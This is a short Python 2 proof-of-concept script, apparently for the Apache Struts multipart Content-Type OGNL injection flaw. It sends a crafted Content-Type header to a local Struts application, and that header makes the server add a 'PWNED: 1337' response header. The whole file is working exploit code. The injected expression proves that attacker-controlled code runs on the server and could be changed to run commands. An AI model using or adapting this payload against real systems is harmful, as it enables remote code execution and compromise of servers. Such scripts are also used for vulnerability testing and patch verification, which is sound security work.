#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import urllib2
import httplib

ognl_payload = ".multipart/form-data~${"
ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
ognl_payload += "}"
url = 'http://localhost:8080/basic-struts/index.action'

print("[exploit.py] Injecting Header PWNED: 1337")
print("[exploit.py] Making request to %s now..." % url)

headers = {'Content-Type': ognl_payload}
request = urllib2.Request(url, headers=headers)
response = urllib2.urlopen(request)
print(response.headers)
